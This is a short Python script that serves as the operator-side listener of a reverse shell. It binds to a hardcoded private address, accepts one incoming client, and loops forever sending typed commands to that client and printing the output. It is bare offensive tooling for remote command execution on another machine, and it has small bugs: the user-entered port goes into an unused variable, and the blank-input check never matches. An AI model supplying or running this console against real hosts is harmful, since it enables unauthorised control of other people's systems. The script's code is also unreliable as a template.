import socket

# Get our local IP and a specified port
HOST = "192.168.73.224"  # '192.168.42.82'
PORT = 8081  # 2222

new_port = input("Input host port (blank if defauly):")
if new_port != "\n":
    REMOTE_PORT = new_port

# Bind the IP to the port -> create a socket
server = socket.socket()
server.bind((HOST, PORT))

# Starting the Listener
print("[+] Server Started")
print("[+] Listening for Client Connetion...")
server.listen(1)
client, client_addr = server.accept()
print(f"[+] {client_addr} Client connected to server")


# Sending and receiving commands in an infinite loop
while True:
    command = input("Enter command: ")
    command = command.encode()
    client.send(command)
    print("[+] Command sent")
    output = client.recv(1024)
    output = output.decode()
    print(f"Output: {output}")
